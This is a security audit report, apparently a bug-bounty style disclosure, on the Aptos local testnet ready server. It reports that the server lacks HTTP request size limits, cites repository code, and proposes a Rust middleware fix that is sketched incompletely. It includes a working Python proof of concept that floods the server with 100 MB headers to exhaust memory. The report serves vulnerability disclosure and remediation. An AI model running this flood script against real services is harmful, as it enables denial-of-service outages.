# Audit Report

## Title
Missing Request Size Limits in Ready Server Enables Memory Exhaustion DoS Attack

## Summary
The `run_ready_server()` function lacks HTTP request size validation, enabling memory exhaustion attacks through arbitrarily large requests. While the main Aptos Node API employs `PostSizeLimit` middleware to enforce an 8 MB request size limit, the ready server has no such protection, violating the Resource Limits invariant.

## Finding Description

The ready server initializes without request size controls: [1](#0-0) 

Only `Tracing` middleware is applied—no size validation exists. In contrast, the production API enforces explicit limits: [2](#0-1) 

Using a default 8 MB threshold: [3](#0-2) 

The middleware validates `Content-Length` headers and rejects oversized payloads: [4](#0-3) 

**Attack Path:**

Though only GET is registered [5](#0-4) , attackers can exploit this via:

1. **Massive HTTP headers** (e.g., multi-GB Cookie/User-Agent headers on GET requests)
2. **Unsupported methods with large bodies** (POST/PUT with huge Content-Length—Poem parses headers/bodies before routing rejection)
3. **Concurrent request flooding** to amplify memory consumption

The server binds to `0.0.0.0` in containers, exposing it network-wide: [7](#0-6) 

## Impact Explanation

**Severity: Medium**

This enables **memory exhaustion DoS attacks** causing:
- Ready server process crashes (OOM conditions)
- System-wide instability from memory pressure
- Health monitoring unavailability

While categorized under High severity "API crashes" criteria, mitigation factors reduce this to **Medium**:
- Component is for local testnet, not production validators
- Requires network exposure (non-default outside containers)
- Impact limited to availability (no funds/consensus affected)
- The codebase's use of `PostSizeLimit` in production APIs demonstrates this attack class is considered valid, distinguishing it from out-of-scope "network-level DoS"

## Likelihood Explanation

**Likelihood: Low-Medium**

**Increasing factors:**
- Container deployments auto-bind to `0.0.0.0` [7](#0-6) 
- Developers may expose ports for remote monitoring
- No authentication/rate-limiting present
- Trivial exploitation (basic HTTP tools suffice)

**Decreasing factors:**
- Designed for local development [8](#0-7) 
- Default localhost binding when not containerized
- Not used in production mainnet infrastructure
- Port 8070 typically firewalled

Cloud-deployed localnets with permissive security groups present realistic exposure.

## Recommendation

Apply `PostSizeLimit` middleware. Since `PostSizeLimit` resides in the `api` crate and the ready server is in the `aptos` crate, either:

**Option 1**: Extract `PostSizeLimit` to a shared crate accessible to both
**Option 2**: Implement equivalent validation directly:

```rust
use poem::{Endpoint, Middleware, Request, Result, error::SizedLimitError};

const READY_SERVER_MAX_REQUEST_SIZE: u64 = 1024 * 1024; // 1 MB

pub struct RequestSizeLimit { max_size: u64 }

impl<E: Endpoint> Middleware<E> for RequestSizeLimit {
    type Output = RequestSizeLimitEndpoint<E>;
    fn transform(&self, ep: E) -> Self::Output {
        RequestSizeLimitEndpoint { inner: ep, max_size: self.max_size }
    }
}

// Apply in run_ready_server():
let app = Route::new()
    .at("/", get(root))
    .data(HealthCheckers { health_checkers })
    .with(Tracing)
    .with(RequestSizeLimit { max_size: READY_SERVER_MAX_REQUEST_SIZE });
```

## Proof of Concept

```python
#!/usr/bin/env python3
import socket
import time

# Target: ready server on 0.0.0.0:8070
TARGET_HOST = "localhost"
TARGET_PORT = 8070

def send_large_request():
    """Send GET request with massive headers to exhaust memory"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_HOST, TARGET_PORT))
    
    # Craft request with 100MB of header data
    massive_header = "X-Custom-Header: " + ("A" * (100 * 1024 * 1024)) + "\r\n"
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"{massive_header}"
        f"\r\n"
    )
    
    sock.sendall(request.encode())
    sock.close()

# Launch concurrent attacks
print("[*] Starting memory exhaustion attack...")
for i in range(10):
    try:
        send_large_request()
        print(f"[+] Sent attack request {i+1}")
        time.sleep(0.1)
    except Exception as e:
        print(f"[-] Request {i+1} failed: {e}")

print("[*] Attack complete. Check ready server memory usage.")
```

**Expected Result**: Ready server memory consumption spikes dramatically, potentially causing OOM crash or system instability. Production API with `PostSizeLimit` would reject these requests immediately.

## Notes

This vulnerability demonstrates an inconsistent security posture between production APIs (protected via [2](#0-1) ) and development infrastructure. While the ready server targets local testing environments, defense-in-depth principles mandate uniform request validation across all HTTP-exposed surfaces to prevent accidental production deployment of vulnerable configurations.

### Citations

**File:** crates/aptos/src/node/local_testnet/ready_server.rs (L57-61)
```rust
#[async_trait]
impl ServiceManager for ReadyServerManager {
    fn get_name(&self) -> String {
        "Ready Server".to_string()
    }
```

**File:** crates/aptos/src/node/local_testnet/ready_server.rs (L85-95)
```rust
    let app = Route::new()
        .at("/", get(root))
        .data(HealthCheckers { health_checkers })
        .with(Tracing);
    Server::new(TcpListener::bind(SocketAddrV4::new(
        bind_to,
        config.ready_server_listen_port,
    )))
    .name("ready-server")
    .run(app)
    .await?;
```

**File:** api/src/runtime.rs (L255-255)
```rust
            .with(PostSizeLimit::new(size_limit))
```

**File:** config/src/config/api_config.rs (L97-97)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
```

**File:** api/src/check_size.rs (L48-55)
```rust
        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }
```

**File:** crates/aptos/src/node/local_testnet/mod.rs (L274-283)
```rust
        let bind_to = match self.bind_to {
            Some(bind_to) => bind_to,
            None => {
                if running_inside_container {
                    Ipv4Addr::new(0, 0, 0, 0)
                } else {
                    Ipv4Addr::new(127, 0, 0, 1)
                }
            },
        };
```
